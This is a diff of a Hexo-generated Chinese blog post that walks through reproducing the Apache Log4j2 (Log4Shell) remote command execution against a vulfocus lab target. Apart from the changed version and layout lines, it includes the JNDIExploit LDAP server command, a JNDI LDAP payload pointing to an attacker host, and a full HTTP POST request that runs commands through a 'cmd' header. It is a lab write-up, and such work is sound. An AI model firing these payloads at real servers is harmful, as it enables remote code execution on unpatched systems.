@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -253,22 +253,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>Apache Log4j2远程命令执行复现<a id="more"></a></p>
+        <p>Apache Log4j2远程命令执行复现<span id="more"></span></p>
 <h1 id="启动靶场环境"><a href="#启动靶场环境" class="headerlink" title="启动靶场环境"></a>启动靶场环境</h1><p>直接用vulfocus启一个环境。<br>官网地址：<a target="_blank" rel="noopener" href="http://vulfocus.fofa.so/">http://vulfocus.fofa.so/</a></p>
-<img src="http://img.npfs06.top/20211215190204.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211215190204.png" style="zoom:80%;" />
 
 
 
 <h1 id="用JNDIExploit启一个ldap的服务"><a href="#用JNDIExploit启一个ldap的服务" class="headerlink" title="用JNDIExploit启一个ldap的服务"></a>用JNDIExploit启一个ldap的服务</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">3</span>-SNAPSHOT.jar -l <span class="number">32703</span> -p <span class="number">32701</span> -i <span class="number">0.0.0.0</span></span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20211215190254.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20211215190254.png" style="zoom:80%;" />
 
 <h1 id="发包"><a href="#发包" class="headerlink" title="发包"></a>发包</h1><p>payload更改如下：</p>
 <figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;<span class="attribute">jndi</span>:ldap://xxx<span class="variable">.xxx</span><span class="variable">.xxx</span><span class="variable">.xxx</span>:32703/TomcatBypass/TomcatEcho&#125;</span><br></pre></td></tr></table></figure>
+
 <p>数据包如下：（在请求头中添加cmd字段，后面跟上需要执行的命令即可。）</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/hello</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> vulfocus.fofa.so:41624</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">cmd</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line">payload=$&#123;jndi:ldap://xxx.xxx.xxx.xxx:30703/TomcatBypass/TomcatEcho&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/hello</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> vulfocus.fofa.so:41624</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">cmd</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line"><span class="language-roboconf">payload=$&#123;<span class="attribute">jndi</span>:ldap://xxx<span class="variable">.xxx</span><span class="variable">.xxx</span><span class="variable">.xxx</span>:30703/TomcatBypass/TomcatEcho&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>注意Content-Type的类型为：<code>application/x-www-form-urlencoded</code></p>
 <p><strong>成功回显命令：</strong></p>
-<img src="http://img.npfs06.top/20211215190740.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211215190740.png" style="zoom:80%;" />
     </div>
 
     
@@ -382,7 +385,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -446,7 +449,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
